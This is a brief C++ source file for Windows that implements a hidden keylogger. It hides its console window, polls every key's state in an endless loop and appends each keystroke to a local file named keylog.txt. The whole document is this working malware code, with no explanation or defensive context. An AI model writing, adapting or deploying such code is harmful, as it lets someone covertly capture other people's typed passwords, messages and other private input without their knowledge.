#include <iostream>
#include <fstream>
#include <windows.h>

void log_keystrokes() {
    std::ofstream log_file("keylog.txt", std::ios::app);
    while (true) {
        for (char c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                log_file << c;
                log_file.flush();
            }
        }
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide console window
    log_keystrokes();
    return 0;
}
